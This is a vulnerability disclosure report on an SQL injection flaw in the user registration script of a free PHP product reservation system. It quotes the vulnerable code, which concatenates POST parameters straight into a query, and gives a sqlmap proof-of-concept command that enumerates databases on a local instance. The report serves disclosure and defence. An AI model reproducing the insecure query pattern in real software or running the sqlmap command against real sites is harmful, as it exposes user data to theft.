# SQL Injection Vulnerability in register_code.php (User Registration)

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)
**Download Link**: https://code-projects.org/online-product-reservation-system-in-php-with-source-code/

**Vulnerable File**: handgunner-administrator/register_code.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the user registration functionality. The application directly concatenates multiple POST parameters into SQL INSERT query without validation, allowing attackers to extract database data and manipulate user registration.

### Analyse

**Vulnerability: SQL Injection in INSERT Query**

```php
<?php include('../config/config.php'); ?>

<?php
// Line 5-15: Multiple user inputs from POST without validation
$fname = $_POST['fname'];
$lname = $_POST['lname'];
$address = $_POST['address'];
$city = $_POST['city'];
$email = $_POST['email'];
$username = $_POST['username'];
$password = md5($_POST['password']);
$province = $_POST['province'];
$country = $_POST['country'];
$zip = $_POST['zip'];
$tel_no = $_POST['tel_no'];

// Line 17-18: VULNERABLE! Direct concatenation into INSERT query
mysql_query("INSERT into users (fname, lname, address, city, province, country, code, tel_no, email, username, password)
	VALUES ('$fname','$lname','$address','$city','$province','$country','$zip','$tel_no','$email','$username','$password')") or die(mysq_error());
?>
```

**Vulnerability Analysis**:

1. **Multiple Injection Points**: All POST parameters vulnerable (fname, lname, address, city, province, country, zip, tel_no, email, username)
2. **No Input Validation**: All parameters directly concatenated into SQL query
3. **No Prepared Statements**: Uses deprecated `mysql_query()` function
4. **No Authentication**: File can be accessed without login
5. **Error Disclosure**: MySQL errors directly displayed to user
6. **Weak Password Hashing**: Uses MD5 (cryptographically broken)

### POC

```bash
sqlmap -u "http://localhost:8081/handgunner-administrator/register_code.php" \
  --data="fname=test&lname=test&address=test&city=test&province=test&country=test&zip=123&tel_no=123&email=test@test.com&username=test&password=pass123" \
  --batch \
  -D cj_handgunner \
  --dbs
```

![1767460492874.png](https://youke3.picui.cn/s1/2026/01/04/69594e5b40a68.png)

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
